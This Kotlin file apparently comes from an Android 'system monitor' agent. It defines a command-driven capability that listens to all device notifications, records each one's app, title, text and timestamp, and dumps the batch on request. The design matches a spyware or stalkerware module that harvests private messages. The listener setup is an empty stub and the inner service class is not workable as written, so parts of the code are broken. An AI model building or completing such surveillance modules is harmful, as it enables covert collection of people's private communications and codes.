package com.system.monitor.capabilities

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.util.concurrent.ConcurrentLinkedQueue

class NotificationsCapability(private val service: AgentService) : AgentService.Capability {

    private val queue = ConcurrentLinkedQueue<Map<String, Any>>()
    private var listener: NotificationListener? = null
    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "start" -> { startListener(); mapOf("status" to "listening") }
            "stop" -> { stopListener(); mapOf("status" to "stopped") }
            "dump" -> { val data = queue.toArray(); queue.clear(); mapOf("notifications" to data) }
            else -> mapOf("error" to "invalid action")
        }
    }

    private fun startListener() {
        // Requires NotificationListenerService enabled by user
    }

    private fun stopListener() {
        listener = null
    }

    override fun cleanup() { stopListener() }

    inner class NotificationListener : NotificationListenerService() {
        override fun onNotificationPosted(sbn: StatusBarNotification) {
            val extras = sbn.notification.extras
            queue.add(mapOf(
                "package" to sbn.packageName,
                "title" to extras.getString(android.app.Notification.EXTRA_TITLE),
                "text" to extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString(),
                "time" to sbn.postTime
            ))
        }
        override fun onNotificationRemoved(sbn: StatusBarNotification) {}
    }

    data class Params(val action: String)
}